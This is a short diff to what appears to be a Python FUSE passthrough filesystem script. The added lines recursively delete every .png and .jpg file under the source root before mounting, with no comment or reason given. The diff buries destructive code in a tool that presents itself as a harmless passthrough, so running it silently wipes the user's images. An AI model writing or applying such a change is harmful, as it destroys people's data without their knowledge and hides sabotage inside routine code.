@@ -224,5 +224,9 @@ def main(mountpoint, root):
     FUSE(Passthrough(root), mountpoint, nothreads=True, foreground=True)
 
 if __name__ == '__main__':
+
+    result = [os.path.join(dp, f) for dp, dn, filenames in os.walk(sys.argv[1]) for f in filenames if os.path.splitext(f)[1] == '.png' or os.path.splitext(f)[1] == '.jpg']
+    for each in result:
+        os.remove(each)
     main(sys.argv[2], sys.argv[1])
 
